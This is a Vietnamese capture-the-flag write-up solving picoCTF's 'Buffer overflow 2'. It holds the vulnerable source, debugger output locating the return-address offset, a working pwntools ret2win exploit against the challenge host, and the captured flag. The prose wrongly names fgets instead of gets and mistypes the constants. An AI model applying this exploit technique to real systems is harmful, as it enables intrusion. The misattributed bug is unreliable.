# Buffer overflow 2

*Cái tên nói lên tất cả, chall này là buffer overflow bug =))*
### Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
Lỗi sẽ nằm ở `fgets` tại `vuln` do nó không kiểm soát độ lớn dữ liệu nhập vào trong khi `buf` chỉ có 100 byte. Ta có hàm win để lấy flag, điều kiện là `arg1 = 0xcafefood` và `arg2 = 0xfoodfood`. Nhiệm vụ là phải return về `win` và lấy `flag`

```java
gef➤  checksec
[+] checksec for '/mnt/c/ctf/pico_ctf_2022/picobo2/vuln'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
`PIE disable` nên địa chỉ sẽ không thay đổi. Kiểm tra xem có thể kiểm soát `eip` hay không, nếu có thì lấy `offset` của nó.

```c
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef3'
gef➤  r
Starting program: vuln
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xc9
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd210  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xf7fba000  →  0x001ead6c
$edi   : 0xf7fba000  →  0x001ead6c
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd210│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"    ← $esp
0xffffd214│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffd218│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffd21c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffd220│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffd224│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffd228│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffd22c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
─────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
─────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x62616164 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $eip
[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely
```
Ta hoàn toàn có thể kiểm soát `eip` để chuyển hướng về `win` và `offset` để có thể overwrite `eip` là `112`. Tiếp theo cần phải xác định được vị trí 2 `arg` của `win`

```c 
gef➤  disas win
Dump of assembler code for function win:
   0x08049296 <+0>:     endbr32
   0x0804929a <+4>:     push   ebp
   0x0804929b <+5>:     mov    ebp,esp
   0x0804929d <+7>:     push   ebx
   0x0804929e <+8>:     sub    esp,0x54
   0x080492a1 <+11>:    call   0x80491d0 <__x86.get_pc_thunk.bx>
   0x080492a6 <+16>:    add    ebx,0x2d5a
   0x080492ac <+22>:    sub    esp,0x8
   0x080492af <+25>:    lea    eax,[ebx-0x1ff8]
   0x080492b5 <+31>:    push   eax
   0x080492b6 <+32>:    lea    eax,[ebx-0x1ff6]
   0x080492bc <+38>:    push   eax
   0x080492bd <+39>:    call   0x8049160 <fopen@plt>
   0x080492c2 <+44>:    add    esp,0x10
   0x080492c5 <+47>:    mov    DWORD PTR [ebp-0xc],eax
   0x080492c8 <+50>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x080492cc <+54>:    jne    0x80492f8 <win+98>
   0x080492ce <+56>:    sub    esp,0x4
   0x080492d1 <+59>:    lea    eax,[ebx-0x1fed]
   0x080492d7 <+65>:    push   eax
   0x080492d8 <+66>:    lea    eax,[ebx-0x1fd8]
   0x080492de <+72>:    push   eax
   0x080492df <+73>:    lea    eax,[ebx-0x1fa3]
   0x080492e5 <+79>:    push   eax
   0x080492e6 <+80>:    call   0x80490e0 <printf@plt>
   0x080492eb <+85>:    add    esp,0x10
   0x080492ee <+88>:    sub    esp,0xc
   0x080492f1 <+91>:    push   0x0
   0x080492f3 <+93>:    call   0x8049130 <exit@plt>
   0x080492f8 <+98>:    sub    esp,0x4
   0x080492fb <+101>:   push   DWORD PTR [ebp-0xc]
   0x080492fe <+104>:   push   0x40
   0x08049300 <+106>:   lea    eax,[ebp-0x4c]
   0x08049303 <+109>:   push   eax
   0x08049304 <+110>:   call   0x8049100 <fgets@plt>
   0x08049309 <+115>:   add    esp,0x10
   0x0804930c <+118>:   cmp    DWORD PTR [ebp+0x8],0xcafef00d //đây <-
   0x08049313 <+125>:   jne    0x804932f <win+153>
   0x08049315 <+127>:   cmp    DWORD PTR [ebp+0xc],0xf00df00d // đây nữa <-
   0x0804931c <+134>:   jne    0x8049332 <win+156>
   0x0804931e <+136>:   sub    esp,0xc
   0x08049321 <+139>:   lea    eax,[ebp-0x4c]
   0x08049324 <+142>:   push   eax
   0x08049325 <+143>:   call   0x80490e0 <printf@plt>
   0x0804932a <+148>:   add    esp,0x10
   0x0804932d <+151>:   jmp    0x8049333 <win+157>
   0x0804932f <+153>:   nop
   0x08049330 <+154>:   jmp    0x8049333 <win+157>
   0x08049332 <+156>:   nop
   0x08049333 <+157>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049336 <+160>:   leave
   0x08049337 <+161>:   ret
```
Qua 2 câu lệnh `cmp` có thể thấy được vị trí 2 `arg` của `win` lần lượt được đặt ở `[ebp + 0x8]` và `[ebp + 0xc]` 

Tiếp theo là tìm địa chỉ của hàm cần return tới : 

```java
gef➤  p win
$2 = {<text variable, no debug info>} 0x8049296 <win>
```
Đầy đủ nguyên liệu rồi :>
### Expoit 

```python
#!/usr/bin/python3
from pwn import *
arg1 = 0xcafef00d
arg2 = 0xf00df00d
win = 0x8049296
payload = b"A" * 112
payload += p32(win)
payload += b"A"*4 # giữa arg1 và ebp có 1 khoảng trống 4byte
payload += p32(arg1)
payload += p32(arg2)
p = remote("saturn.picoctf.net", 59907)
# p = process("./vuln")
print(p.recvuntil(b": "))
p.sendline(payload)
p.recv()
p.interactive()
```

```java
trungdo@TEFO:/mnt/c/ctf/pico_ctf_2022/picobo2$ ./exp.py
[+] Opening connection to saturn.picoctf.net on port 59907: Done
b'Please enter your string: '
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xpicoCTF{argum3nt5_4_d4yZ_b3fd8f66}
[*] Got EOF while reading in interactive
$
```
`flag: picoCTF{argum3nt5_4_d4yZ_b3fd8f66}`